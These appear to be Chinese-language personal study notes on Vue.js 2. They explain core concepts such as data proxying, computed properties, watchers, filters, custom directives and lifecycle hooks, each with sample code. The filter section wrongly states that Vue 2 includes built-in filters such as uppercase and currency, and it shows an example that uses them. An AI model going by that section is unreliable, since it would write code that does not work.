[TOC]
# 渐进式框架

"渐进式框架"是指一种框架设计理念，它允许开发者在使用框架时逐步采用框架提供的各种功能，而不是强制性地要求开发者一开始就全部采用框架的所有特性。
具体来说，渐进式框架通常具有以下特点：
1. **模块化和可选性：** 渐进式框架通常将功能划分为独立的模块，开发者可以根据自己的需求选择性地采用这些模块。这意味着开发者可以根据项目的实际需求，逐步引入框架的各种功能，而不必一开始就全部引入。
2. **低入门门槛：** 渐进式框架通常提供了简单易懂的基础功能，使得新手开发者可以快速上手并构建基本的应用。随着项目的发展，开发者可以逐步引入更复杂的功能和特性。
3. **灵活性和可定制性：** 渐进式框架通常具有一定程度的灵活性和可定制性，开发者可以根据自己的需求定制框架的行为，或者选择替代方案来满足特定的需求。
Vue.js自称为渐进式框架，因为它允许开发者逐步采用Vue.js提供的各种功能，从简单的数据绑定和模板语法开始，逐渐引入组件化、路由、状态管理等高级特性，使得开发者可以根据项目的实际需求选择性地采用Vue.js的不同功能，而不必被迫一开始就使用框架的全部功能。这种设计理念使得Vue.js适用于各种规模的项目，并且对于新手开发者来说也具有较低的学习曲线。

# 单页面应用

单页面应用（Single Page Application，SPA）是一种Web应用程序的架构模式，它在加载初始页面后，不会因为用户的操作而重新加载整个页面，而是通过动态更新页面的方式来实现页面内容的变化。下面是单页面应用的优缺点：
优点：
1. 用户体验好：SPA在用户与页面交互时，无需频繁地刷新页面，可以提供更流畅的用户体验，减少页面闪烁和加载时间。
2. 前后端分离：SPA可以实现前后端分离，前端负责页面渲染和交互逻辑，后端负责数据接口和业务逻辑，降低了系统的耦合度。
3. 减少服务器负担：由于SPA只需加载一次页面，之后的页面内容变化通过异步请求数据来实现，可以减轻服务器的负担，提高服务器性能。
4. 跨平台性：SPA可以更好地支持移动设备，因为它可以通过API与后端通信，动态更新页面内容，适应不同的屏幕尺寸和设备类型。
缺点：
1. 首次加载时间长：由于SPA需要一次性加载所有相关的JavaScript和CSS文件，因此首次加载时间可能会比传统多页面应用长。
2. SEO(搜索引擎优化)难度较大：搜索引擎对于SPA的抓取和索引能力有限，相对于传统多页面应用，SPA的SEO(搜索引擎优化)优化难度较大。
3. 安全性考虑：由于SPA通常会使用大量的JavaScript代码来实现页面逻辑，因此需要特别注意安全性问题，避免受到XSS等攻击。
4. 前进后退按钮问题：SPA在浏览器的历史记录中只有一个入口，因此在处理浏览器的前进后退按钮时需要特别注意，以保证用户体验。
综合来看，单页面应用适合对用户体验要求较高、需要与后端分离、注重跨平台性的应用场景，但也需要注意其在首次加载时间、SEO(搜索引擎优化)优化、安全性和浏览器历史记录等方面的局限性。

# 虚拟 DOM

虚拟DOM（Virtual DOM）是前端框架中常见的一种性能优化技术，它的原理可以简单概括如下：
1. **创建虚拟DOM：** 当页面的状态发生变化时，框架会创建一颗虚拟DOM树，这颗树是对真实DOM的抽象表示，它包含了整个页面的结构和内容。
2. **对比差异：** 在有新的状态变化时，框架会比较新旧两颗虚拟DOM树之间的差异，找出需要进行更新的部分。
3. **更新最小化：** 框架会根据差异找出需要更新的部分，并只更新这些部分到真实的DOM中，而不是重新渲染整个页面。
虚拟DOM的原理主要基于以下两个假设：
- **DOM操作昂贵：** 直接对真实的DOM进行操作（比如增删改查）是比较昂贵的，会引起页面的重排和重绘，影响性能。
- **内存操作便宜：** 对虚拟DOM进行操作是在内存中进行的，成本较低，而且可以批量处理，不会立即影响到页面的表现。
通过使用虚拟DOM，框架可以在内存中构建出一颗虚拟的DOM树，然后在状态变化时，通过比较新旧两颗虚拟DOM树之间的差异，只更新需要更新的部分到真实的DOM中，从而减少了对真实DOM的操作次数，提高了页面的渲染性能。
需要注意的是，并非所有的前端框架都使用虚拟DOM，但虚拟DOM的概念和原理对于理解前端性能优化和框架设计仍然具有重要意义。

假设有一个简单的列表页面，包含一个列表和一个按钮，点击按钮时会向列表中添加一个新的项。使用虚拟DOM进行更新最小化的过程如下：
1. **初始渲染：** 首次渲染页面时，框架会创建虚拟DOM树来表示页面的结构，然后将虚拟DOM渲染到真实的DOM中。
2. **状态变化：** 当用户点击按钮时，页面的状态发生变化，需要向列表中添加一个新的项。
3. **创建虚拟DOM：** 框架会根据新的状态变化，创建一个新的虚拟DOM树，表示更新后的页面结构。
4. **对比差异：** 框架会比较新旧两颗虚拟DOM树之间的差异，找出需要进行更新的部分，即新添加的列表项。
5. **更新最小化：** 框架只会更新新添加的列表项到真实的DOM中，而不会重新渲染整个列表。这样就减少了对真实DOM的操作次数，提高了页面的渲染性能。
通过更新最小化，框架可以在状态变化时，只更新需要更新的部分到真实的DOM中，而不是重新渲染整个页面，从而提高了页面的渲染性能。

# 文档

## vue2.0

[教程](https://v2.cn.vuejs.org/v2/guide/) 教学

[API](https://v2.cn.vuejs.org/v2/api/) API 速查字典

[风格指南 — Vue.js (vuejs.org)](https://v2.cn.vuejs.org/v2/style-guide/) 编码风格推荐

[Markdown 编辑器 — Vue.js (vuejs.org)](https://v2.cn.vuejs.org/v2/examples/) 官方示例

[介绍 — Vue.js (vuejs.org)](https://v2.cn.vuejs.org/v2/cookbook/) 高级特性

[vuejs/awesome-vue: 🎉 A curated list of awesome things related to Vue.js (github.com)](https://github.com/vuejs/awesome-vue)  &  [Awesome Vue packages - Awesome JS](https://awesomejs.dev/for/vue/)   第三方库 （jar）

# 安装

[安装 — Vue.js (vuejs.org)](https://v2.cn.vuejs.org/v2/guide/installation.html)

# Vue.config 全局配置

[API — Vue.js (vuejs.org)](https://v2.cn.vuejs.org/v2/api/#全局配置)

## 实际项目应用示例

main.js

```js
Vue.config.productionTip=false;
Vue.config.devtools=true;
Vue.config.debug=true;
```

# vue

## vue 实例

[Vue 实例 — Vue.js (vuejs.org)](https://v2.cn.vuejs.org/v2/guide/instance.html)

```html
<!-- 
	初识Vue：
		1.想让Vue工作，就必须创建一个Vue实例，且要传入一个配置对象；
		2.root容器里的代码依然符合html规范，只不过混入了一些特殊的Vue语法；
		3.root容器里的代码被称为【Vue模板】；
		4.Vue实例和容器是一一对应的；
		5.真实开发中只有一个Vue实例，并且会配合着组件一起使用；
		6.{{xxx}}中的xxx要写js表达式，且xxx可以自动读取到data中的所有属性；
		7.一旦data中的数据发生改变，那么页面中用到该数据的地方也会自动更新；
		注意区分：js表达式 和 js代码(语句)
				1.表达式：一个表达式会产生一个值，可以放在任何一个需要值的地方：
							(1). a
							(2). a+b (js 表达式)
							(3). demo(1) (函数调用表达式)
							(4). x === y ? 'a' : 'b' (三元表达式)
				2.js代码(语句)
							(1). if(){}
							(2). for(){}
-->
<!-- 准备好一个容器 -->
<div id="demo">
	<h1>Hello，{{name.toUpperCase()}}，{{address}}</h1>
</div>
<script type="text/javascript" >
	Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
	//创建Vue实例
	new Vue({
		el:'#demo', //el用于指定当前Vue实例为哪个容器服务，值通常为css选择器字符串。也可写为 document.getElementById("demo")
		data:{ //data中用于存储数据，数据供el所指定的容器去使用，值我们暂时先写成一个对象。
			name:'atguigu',
			address:'北京'
		}
	})
</script>
```

### data 与 el 的 2 种写法

在vue对象中，所有以`$`符号开头的属性，包括其原型上的`$`符号开头的属性，都是给程序员使用的

例如 data与el的2种写法

data与el的2种写法
	1.el有2种写法
		(1).new Vue时候配置el属性。
		(2).先创建Vue实例，随后再通过vm.$mount('#root')指定el的值。
	2.data有2种写法
		(1).对象式
		(2).函数式
		如何选择：**目前哪种写法都可以，以后学习到组件时，data必须使用函数式，否则会报错。**
	3.一个重要的原则：
		**由Vue管理的函数，一定不要写箭头函数，一旦写了箭头函数，this就不再是Vue实例了**。

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>el与data的两种写法</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<h1>你好，{{name}}</h1>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		//el的两种写法
		/* const v = new Vue({
			//el:'#root', //第一种写法
			data:{
				name:'尚硅谷'
			}
		})
		console.log(v)
		v.$mount('#root') //第二种写法 */

		//data的两种写法
		new Vue({
			el:'#root',
			//data的第一种写法：对象式
			/* data:{
				name:'尚硅谷'
			} */

			//data的第二种写法：函数式
			data(){
				console.log('@@@',this) //此处的this是Vue实例对象
				return{
					name:'尚硅谷'
				}
			}
		})
	</script>
</html>
```

### $mount 挂载

在Vue.js中，`$mount` 是Vue实例的一个方法，它用于手动挂载（或者说手动渲染）Vue实例到一个DOM元素上。通常情况下，Vue实例会在创建时自动挂载到指定的DOM元素上，但有时候我们也需要手动控制Vue实例的挂载过程，这时就可以使用 `$mount` 方法。
以下是 `$mount` 方法的一些主要用法和特点：
1. **手动挂载：**
   ```javascript
   var vm = new Vue({
     data: {
       message: 'Hello, Vue!'
     }
   });
   vm.$mount('#app');
   ```
   在这个例子中，我们首先创建了一个Vue实例 `vm`，然后使用 `$mount` 方法手动将该实例挂载到id为 `app` 的DOM元素上。这样就实现了手动挂载Vue实例到指定的DOM元素上。
2. **延迟挂载：**
   ```javascript
   var vm = new Vue({
     data: {
       message: 'Hello, Vue!'
     }
   });
   vm.$mount(); // 手动挂载
   document.getElementById('app').appendChild(vm.$el); // 将挂载后的DOM元素手动添加到页面上
   ```
   在这个例子中，我们先创建了Vue实例 `vm`，然后使用 `$mount` 方法手动进行挂载，但没有指定挂载的目标元素，然后通过 `vm.$el` 获取到挂载后的DOM元素，最后手动将该DOM元素添加到页面上。
3. **动态挂载：**
   ```javascript
   var vm = new Vue({
     data: {
       message: 'Hello, Vue!'
     }
   });
   vm.$mount('#app'); // 初始挂载
   // ...一些操作后，需要重新挂载到新的DOM元素上
   vm.$mount('#new-app'); // 动态重新挂载到新的DOM元素上
   ```
   在这个例子中，我们首先将Vue实例 `vm` 初始挂载到id为 `app` 的DOM元素上，然后在一些操作后，需要将该实例重新挂载到id为 `new-app` 的DOM元素上，这时可以再次使用 `$mount` 方法来实现动态重新挂载。
   总的来说，`$mount` 方法是Vue实例的一个重要方法，它提供了手动控制Vue实例挂载过程的能力，可以实现手动挂载、延迟挂载、动态挂载等操作，对于一些特定的场景和需求非常有用。

### MVVM

MVVM模型
		1. M：模型(Model) ：data中的数据
		2. V：视图(View) ：模板代码
		3. VM：视图模型(ViewModel)：Vue实例
		观察发现：
		1.data中所有的属性，最后都出现在了vm身上。
		2.vm身上所有的属性 及 Vue原型上所有属性，在Vue模板中都可以直接使用。
例如

```html
<h1>测试一下2：{{$options}}</h1>
<h1>测试一下3：{{$emit}}</h1>
<h1>测试一下4：{{_c}}</h1>
```

![image-20240313093833175](https://raw.githubusercontent.com/MrSunflowers/images/main/note/images/202403130938404.png)

### 数据代理

#### defineProperty

`Object.defineProperty` 方法是 JavaScript 中用于定义或修改对象属性的方法。通过这个方法，你可以精确地控制一个对象的属性。它接受三个参数：要定义属性的对象、要定义或修改的属性的名称，以及属性描述符对象。
属性描述符对象可以包含以下属性：
1. `configurable`：布尔值，表示属性是否可以被删除或是否可以再次修改属性描述符。默认为 false。
2. `enumerable`：布尔值，表示属性是否可以被枚举。默认为 false。
3. `value`：属性的值，默认为 undefined。
4. `writable`：布尔值，表示属性的值是否可以被修改。默认为 false。
5. `get`：获取函数，用于获取属性的值。
6. `set`：设置函数，用于设置属性的值。
例如，你可以使用 `Object.defineProperty` 方法来定义一个新的属性或修改现有属性的特性，比如设置属性的可枚举性、可写性等。这样可以更精细地控制对象的属性行为。

示例一

当你需要定义一个对象，并且希望控制该对象的某个属性时，可以使用 `Object.defineProperty` 方法。比如，我们定义一个名为 `person` 的对象，然后使用 `Object.defineProperty` 方法来定义该对象的一个属性 `age`，并控制该属性的特性：
```javascript
let person = {};
Object.defineProperty(person, 'age', {
  value: 25,
  writable: false, // 不可写
  enumerable: true, // 可枚举
  configurable: false // 不可配置
});
console.log(person.age); // 输出 25
person.age = 30; // 由于 writable 为 false，因此这里会报错或者忽略（严格模式下会报错）
console.log(Object.keys(person)); // 输出 ['age']
delete person.age; // 由于 configurable 为 false，因此无法删除该属性
console.log(person.age); // 输出 25
```
在这个例子中，我们使用 `Object.defineProperty` 方法定义了 `person` 对象的 `age` 属性，并指定了该属性的值为 25，不可写（writable: false），可枚举（enumerable: true），不可配置（configurable: false）。这样就可以精确地控制 `age` 属性的特性。

示例二 定义属性的 getter 和 setter 方法

```javascript
let number = 18
let person = {
	name:'张三',
	sex:'男',
}
Object.defineProperty(person,'age',{
	// value:18,
	// enumerable:true, //控制属性是否可以枚举，默认值是false
	// writable:true, //控制属性是否可以被修改，默认值是false
	// configurable:true //控制属性是否可以被删除，默认值是false
	//当有人读取person的age属性时，get函数(getter)就会被调用，且返回值就是age的值
    // 定义 age 的 getter 方法
	get(){
		console.log('有人读取age属性了')
		return number
	},
	//当有人修改person的age属性时，set函数(setter)就会被调用，且会收到修改的具体值
    // 定义 age 的 setter 方法
	set(value){
		console.log('有人修改了age属性，且值是',value)
		number = value
	}
})
// console.log(Object.keys(person))
console.log(person)
```

![image-20240313142429175](https://raw.githubusercontent.com/MrSunflowers/images/main/note/images/202403131424293.png)

所有类似于上图的，控制台中没有直接显示属性值的，而是用（...）代替的情况，都是重写了其 getter 和 setter 方法的

#### 数据代理

```html
<!-- 数据代理：通过一个对象代理对另一个对象中属性的操作（读/写）-->
<script type="text/javascript" >
	let obj = {x:100}
	let obj2 = {y:200}
	Object.defineProperty(obj2,'x',{
		get(){
			return obj.x
		},
		set(value){
			obj.x = value
		}
	})
</script>
```

#### vue 中的数据代理

1.Vue中的数据代理：
				通过vm对象来代理data对象中属性的操作（读/写）
	2.Vue中数据代理的好处：
				更加方便的操作data中的数据
	3.基本原理：
				通过Object.defineProperty()把data对象中所有属性添加到vm上。
				为每一个添加到vm上的属性，都指定一个getter/setter。
				在getter/setter内部去操作（读/写）data中对应的属性。

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>Vue中的数据代理</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 
				1.Vue中的数据代理：
							通过vm对象来代理data对象中属性的操作（读/写）
				2.Vue中数据代理的好处：
							更加方便的操作data中的数据
				3.基本原理：
							通过Object.defineProperty()把data对象中所有属性添加到vm上。
							为每一个添加到vm上的属性，都指定一个getter/setter。
							在getter/setter内部去操作（读/写）data中对应的属性。
		 -->
		<!-- 准备好一个容器-->
		<div id="root">
			<h2>学校名称：{{name}}</h2>
			<h2>学校地址：{{address}}</h2>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
		
		const vm = new Vue({
			el:'#root',
			data:{
				name:'尚硅谷',
				address:'宏福科技园'
			}
		})
	</script>
</html>
```

![image-20240313143314084](https://raw.githubusercontent.com/MrSunflowers/images/main/note/images/202403131433159.png)

### _data

Vue._data = 定义的 data

即 Vue._data 代理了定义的 data

![image-20240313144519961](https://raw.githubusercontent.com/MrSunflowers/images/main/note/images/202403131445019.png)

### methods 定义函数

在 Vue.js 中，`methods` 选项用于定义 Vue 实例中的方法。这些方法可以在 Vue 实例的模板中调用，用于处理用户交互、响应事件等操作。在 `methods` 中定义的方法可以在 Vue 实例中通过 `this` 关键字访问，从而实现对数据的操作、事件处理等功能。
下面是一个简单的示例，演示了如何在 Vue 实例中使用 `methods` 选项：
```javascript
var vm = new Vue({
  data: {
    count: 0
  },
  methods: {
    increment: function() {
      this.count++;
    },
    decrement: function() {
      this.count--;
    }
  }
});
```
在这个示例中，我们创建了一个 Vue 实例 `vm`，并在 `data` 选项中定义了一个 `count` 属性，初始值为 0。在 `methods` 选项中定义了两个方法 `increment` 和 `decrement`，分别用于增加和减少 `count` 的值。在模板中可以通过事件绑定调用这些方法，实现对数据的操作。
在模板中调用 `methods` 中的方法的方式通常是通过指令，比如 `@click` 指令：
```html
<button @click="increment">Increment</button>
<button @click="decrement">Decrement</button>
```
通过这种方式，可以在用户交互或事件触发时调用 `methods` 中定义的方法，实现相应的功能。`methods` 选项是 Vue 实例中非常常用的一个选项，用于管理和组织方法，使代码更加清晰和易于维护。

**methods中配置的函数，不要用箭头函数！否则this就不是vm了**

### computed 计算属性

在Vue.js中，`computed` 和 `methods` 都是用于处理逻辑计算的选项，但它们之间有一些重要的区别：

1. **计算属性（computed）**：
   - 计算属性是基于它们的依赖缓存的。只有在计算属性的依赖发生变化时，计算属性才会重新计算。
   - 计算属性适用于基于响应式数据进行计算，并且具有缓存机制，避免不必要的重复计算。
   - 计算属性在模板中使用时，直接像数据属性一样使用，不需要在模板中调用方法。
2. **方法（methods）**：
   - 方法是在调用时执行的函数。每次调用方法时，都会执行其中的代码。
   - 方法适用于需要在模板中触发的事件处理或者动态计算的情况。
   - 方法没有缓存机制，每次调用方法都会执行其中的代码，不会像计算属性一样进行缓存。

### watch 监视属性

在Vue.js中，`watch` 选项用于监听Vue实例中的数据变化，并在数据变化时执行相应的操作。通过 `watch` 选项，我们可以监视特定的数据属性，并在数据发生变化时执行自定义的逻辑。
下面是一个简单的示例来说明如何使用 `watch` 选项：
```html
<div id="app">
  <p>Count: {{ count }}</p>
</div>
```
```javascript
var vm = new Vue({
  el: '#app',
  data: {
    count: 0
  },
  watch: {
    count: function(newValue, oldValue) {
      console.log('Count 发生变化，新值为: ' + newValue + ', 旧值为: ' + oldValue);
    }
  }
});
// 修改 count 的值，触发 watch 监听
vm.count = 1;
```
在这个示例中，我们定义了一个Vue实例 `vm`，其中包含一个数据属性 `count` 和一个 `watch` 选项。在 `watch` 选项中，我们监听了 `count` 属性的变化，并在 `count` 发生变化时打印出新值和旧值。
当我们修改 `count` 的值时，会触发 `watch` 中的监听函数，打印出新值和旧值。这样我们就可以在数据发生变化时执行自定义的操作。
需要注意的是，`watch` 选项可以监听单个属性，也可以监听嵌套属性或数组的变化。除了监听简单的数据属性外，还可以监听对象属性、数组变化等。
总的来说，`watch` 选项提供了一种便捷的方式来监视数据的变化，并在数据变化时执行相应的操作，可以用于处理复杂的数据变化逻辑。

### 添加响应式属性

[深入响应式原理 — Vue.js (vuejs.org)](https://v2.cn.vuejs.org/v2/guide/reactivity.html)

```
Vue监视数据的原理：
	1. vue会监视data中所有层次的数据。
	2. 如何监测对象中的数据？
					通过setter实现监视，且要在new Vue时就传入要监测的数据。
						(1).对象中后追加的属性，Vue默认不做响应式处理
						(2).如需给后添加的属性做响应式，请使用如下API：
										Vue.set(target，propertyName/index，value) 或 
										vm.$set(target，propertyName/index，value)
	3. 如何监测数组中的数据？
						通过包裹数组更新元素的方法实现，本质就是做了两件事：
							(1).调用原生对应的方法对数组进行更新。
							(2).重新解析模板，进而更新页面。
	4.在Vue修改数组中的某个元素一定要用如下方法：
				1.使用这些API:push()、pop()、shift()、unshift()、splice()、sort()、reverse()
				2.Vue.set() 或 vm.$set()
	
	特别注意：Vue.set() 和 vm.$set() 不能给vm 或 vm的根数据对象 添加属性！！！
```

`Vue.set()` 方法是Vue.js提供的用于向响应式对象添加响应式属性的方法。在Vue.js中，如果直接给对象添加新属性，Vue无法检测到这个变化，从而无法触发视图的更新。为了解决这个问题，Vue提供了`Vue.set()` 方法来手动将属性添加到响应式对象中，使其成为响应式属性，从而能够触发视图的更新。
`Vue.set()` 方法的语法如下：
```javascript
Vue.set(object, key, value)
```
- `object`: 要添加属性的目标对象。
- `key`: 要添加的属性名。
- `value`: 要添加的属性值。
使用`Vue.set()` 方法添加属性后，Vue会在内部调用其依赖追踪系统，确保新添加的属性也是响应式的。这样，无论是在模板中使用这个属性，还是通过JavaScript代码访问它，都能够触发视图的更新。
示例：
```javascript
// 假设data中有一个对象obj
// 直接给obj添加一个新属性，Vue无法检测到这个变化
obj.newProperty = 'new value'; // 这样添加属性是不会触发视图更新的
// 使用Vue.set()方法添加属性
Vue.set(obj, 'newProperty', 'new value'); // 这样添加属性会触发视图更新
```
总之，`Vue.set()` 方法是在Vue.js中用于向响应式对象添加属性以确保属性的响应式的重要方法。通过使用`Vue.set()` 方法，可以确保动态添加的属性也能够被Vue正确地追踪并更新视图。

注意：**Vue.set() 的目标不允许时 vue 的事例对象，也不能是 Vue._data**

### filter 过滤器

```
过滤器：
	定义：对要显示的数据进行特定格式化后再显示（适用于一些简单逻辑的处理）。
	语法：
			1.注册过滤器：Vue.filter(name,callback) 或 new Vue{filters:{}}
			2.使用过滤器：{{ xxx | 过滤器名}}  或  v-bind:属性 = "xxx | 过滤器名"
	备注：
			1.过滤器也可以接收额外参数、多个过滤器也可以串联
			2.并没有改变原本的数据, 是产生新的对应的数据
```

```html
<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<h2>显示格式化后的时间</h2>
			<!-- 计算属性实现 -->
			<h3>现在是：{{fmtTime}}</h3>
			<!-- methods实现 -->
			<h3>现在是：{{getFmtTime()}}</h3>
			<!-- 过滤器实现 -->
			<h3>现在是：{{time | timeFormater}}</h3>
			<!-- 过滤器实现（传参） -->
			<h3>现在是：{{time | timeFormater('YYYY_MM_DD') | mySlice}}</h3>
			<h3 :x="msg | mySlice">尚硅谷</h3>
		</div>

		<div id="root2">
			<h2>{{msg | mySlice}}</h2>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false
        
		//全局过滤器
		Vue.filter('mySlice',function(value){
			return value.slice(0,4)
		})
		
		new Vue({
			el:'#root',
			data:{
				time:1621561377603, //时间戳
				msg:'你好，尚硅谷'
			},
			computed: {
				fmtTime(){
					return dayjs(this.time).format('YYYY年MM月DD日 HH:mm:ss')
				}
			},
			methods: {
				getFmtTime(){
					return dayjs(this.time).format('YYYY年MM月DD日 HH:mm:ss')
				}
			},
			//局部过滤器
			filters:{
				timeFormater(value,str='YYYY年MM月DD日 HH:mm:ss'){
					// console.log('@',value)
					return dayjs(value).format(str)
				}
			}
		})

		new Vue({
			el:'#root2',
			data:{
				msg:'hello,atguigu!'
			}
		})
	</script>
```

在Vue.js中，过滤器（Filters）是一种用来处理 Vue 模板中插值表达式的方法，用于对数据进行一些格式化或处理后再显示在页面上。过滤器可以用在双花括号插值（Mustache）和 `v-bind` 表达式中。
使用过滤器可以在模板中轻松地实现一些常见的文本格式化操作，比如格式化日期、转换文本大小写、数字格式化等。Vue提供了一些内置的过滤器，同时也支持自定义过滤器。
##### 内置过滤器
Vue.js内置了一些常用的过滤器，比如：
- `uppercase`: 将文本转换为大写。
- `lowercase`: 将文本转换为小写。
- `capitalize`: 将文本的首字母大写。
- `currency`: 格式化数字为货币格式。
- `date`: 格式化日期。
##### 使用内置过滤器示例：
```html
<div id="app">
  <p>{{ message | uppercase }}</p>
  <p>{{ price | currency }}</p>
</div>
```
```javascript
new Vue({
  el: '#app',
  data: {
    message: 'hello vue',
    price: 100
  }
});
```
##### 自定义过滤器
除了内置过滤器，Vue还支持自定义过滤器，通过`Vue.filter()`方法来定义。自定义过滤器可以接受参数，可以进行更加灵活的数据处理。
##### 自定义过滤器示例：
```html
<div id="app">
  <p>{{ message | reverse }}</p>
</div>
```
```javascript
Vue.filter('reverse', function(value) {
  return value.split('').reverse().join('');
});
new Vue({
  el: '#app',
  data: {
    message: 'hello vue'
  }
});
```
在上面的例子中，自定义了一个名为`reverse`的过滤器，用于将文本颠倒显示。
总之，Vue的过滤器是一种非常方便的数据处理方式，可以在模板中直接使用，使数据的展示更加灵活和易读。通过内置过滤器和自定义过滤器，可以满足各种数据处理需求。

### directives 自定义指令

在Vue.js中，可以通过全局注册和局部注册两种方式来配置自定义指令（Directives）。下面分别介绍这两种注册方式的具体步骤：
#### 全局注册自定义指令
1. **创建自定义指令**：
   ```javascript
   Vue.directive('custom-directive', {
       bind(el, binding) {
           // 指令绑定时的初始化操作
       },
       inserted(el, binding) {
           // 元素插入到父节点时的操作
       },
       update(el, binding) {
           // 元素更新时的操作
       },
       componentUpdated(el, binding) {
           // 组件更新完成时的操作
       },
       unbind(el, binding) {
           // 指令解绑时的清理操作
       }
   });
   ```
2. **在Vue实例中使用**：
   ```html
   <div v-custom-directive></div>
   ```
#### 局部注册自定义指令
1. **创建自定义指令**：
   ```javascript
   export default {
       directives: {
           'custom-directive': {
               bind(el, binding) {
                   // 指令绑定时的初始化操作
               },
               inserted(el, binding) {
                   // 元素插入到父节点时的操作
               },
               update(el, binding) {
                   // 元素更新时的操作
               },
               componentUpdated(el, binding) {
                   // 组件更新完成时的操作
               },
               unbind(el, binding) {
                   // 指令解绑时的清理操作
               }
           }
       }
   };
   ```
2. **在组件中使用**：
   ```html
   <template>
       <div v-custom-directive></div>
   </template>
   ```
   通过以上方式，可以灵活地配置自定义指令，并在需要的地方进行使用。自定义指令的配置对象中可以包含多个钩子函数，用于在不同阶段执行相应的操作，从而实现对DOM元素的定制化控制。

### 生命周期

```
生命周期：
	1.又名：生命周期回调函数、生命周期函数、生命周期钩子。
	2.是什么：Vue在关键时刻帮我们调用的一些特殊名称的函数。
	3.生命周期函数的名字不可更改，但函数的具体内容是程序员根据需求编写的。
	4.生命周期函数中的this指向是vm 或 组件实例对象。
常用的生命周期钩子：
			1.mounted: 发送ajax请求、启动定时器、绑定自定义事件、订阅消息等【初始化操作】。
			2.beforeDestroy: 清除定时器、解绑自定义事件、取消订阅消息等【收尾工作】。
	关于销毁Vue实例
			1.销毁后借助Vue开发者工具看不到任何信息。
			2.销毁后自定义事件会失效，但原生DOM事件依然有效。
			3.一般不会在beforeDestroy操作数据，因为即便操作数据，也不会再触发更新流程了。
```

Vue.js 组件的生命周期函数一共有 8 个，它们的调用顺序如下：

1. **beforeCreate**：
   - 在实例初始化之后，数据观测(data observer)和事件配置(event/watcher)之前被调用。在这个阶段，实例的属性和方法还无法访问。
2. **created**：
   - 实例已经创建完成之后被调用。在这个阶段，实例已经完成数据观测(data observer)，属性和方法的运算，watch/event 事件回调。但是挂载阶段还未开始，$el 属性目前不可见。
3. **beforeMount**：
   - 在挂载开始之前被调用：相关的 render 函数首次被调用。
4. **mounted**：
   - 实例已经挂载到 DOM 上后调用，这时 `vm.$el` 可以访问到实例的根 DOM 元素。如果要操作 DOM 元素，最好在这个阶段进行。
5. **beforeUpdate**：
   - 数据更新时调用，发生在虚拟 DOM 重新渲染和打补丁之前。
6. **updated**：
   - 虚拟 DOM 重新渲染和打补丁之后调用。组件 DOM 已经更新，可以执行依赖于 DOM 的操作。
7. **beforeDestroy**：
   - 实例销毁之前调用。在这一步，实例仍然完全可用。
8. **destroyed**：
   - 实例销毁后调用。在这一步，只剩下实例的一些属性，但是访问它们会报错。

生命周期函数的调用顺序可以总结为：
- 创建阶段：beforeCreate -> created
- 挂载阶段：beforeMount -> mounted
- 更新阶段：beforeUpdate -> updated
- 销毁阶段：beforeDestroy -> destroyed

理解生命周期函数的调用顺序有助于开发者更好地控制组件的行为，并在合适的时机执行相应的操作，比如数据初始化、异步操作、DOM 操作等。

![生命周期](https://raw.githubusercontent.com/MrSunflowers/images/main/note/images/202403151513821.png)

```js
new Vue({
	el:'#root',
	data:{
		n:1
	},
	methods: {
		add(){
			console.log('add')
			this.n++
		}
	},
	watch:{
		n(){
			console.log('n变了')
		}
	},
	beforeCreate() {
		console.log('beforeCreate')
	},
	created() {
		console.log('created')
	},
	beforeMount() {
		console.log('beforeMount')
	},
	mounted() {
		console.log('mounted')
	},
	beforeUpdate() {
		console.log('beforeUpdate')
	},
	updated() {
		console.log('updated')
	},
	beforeDestroy() {
		console.log('beforeDestroy')
	},
	destroyed() {
		console.log('destroyed')
	},
})
```

示例

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>引出生命周期</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<h2 :style="{opacity}">欢迎学习Vue</h2>
			<button @click="opacity = 1">透明度设置为1</button>
			<button @click="stop">点我停止变换</button>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		 new Vue({
			el:'#root',
			data:{
				opacity:1
			},
			methods: {
				stop(){
					this.$destroy()
				}
			},
			//Vue完成模板的解析并把初始的真实DOM元素放入页面后（挂载完毕）调用mounted
			mounted(){
				console.log('mounted',this)
				this.timer = setInterval(() => {
					console.log('setInterval')
					this.opacity -= 0.01
					if(this.opacity <= 0) this.opacity = 1
				},16)
			},
			beforeDestroy() {
				clearInterval(this.timer)
				console.log('vm即将驾鹤西游了')
			},
		})

	</script>
</html>
```

### template 模板

在 Vue 中，容器中的内容也可以定义在 template 中，vue 在解析 template 中的内容时，会使用 template 中的内容完全替换掉 el 容器，而直接解析 el 容器时则会保留容器本身的属性，例如 `:x="n"` 

```html
<!-- 准备好一个容器-->
<div id="root" :x="n">
</div>
<script type="text/javascript">
	new Vue({
		el:'#root',
		template:`
			<div>
				<h2>当前的n值是：{{n}}</h2>
				<button @click="add">点我n+1</button>
			</div>
		`,
		data:{
			n:1
		},
		methods: {
			add(){
				console.log('add')
				this.n++
			}
		},
	})
</script>
```

## 模板语法

root容器里的代码被称为【Vue模板】；

Vue模板语法有2大类：
    1.插值语法：
            功能：用于解析标签体内容。
            写法：{{xxx}}，xxx是js表达式，且可以直接读取到data中的所有属性。
    2.指令语法：
            功能：用于解析标签（包括：标签属性、标签体内容、绑定事件.....）。
            举例：v-bind:href="xxx" 或  简写为 :href="xxx"，xxx同样要写js表达式，
                    且可以直接读取到data中的所有属性。
            备注：Vue中有很多的指令，且形式都是：v-????，此处我们只是拿v-bind举个例子。

1. **插值语法：**
   - 插值语法使用双大括号 `{{ }}` 来插入变量的值或表达式的结果。
   - 插值语法通常用于将数据动态地显示在页面上，例如显示变量的值、计算表达式的结果等。
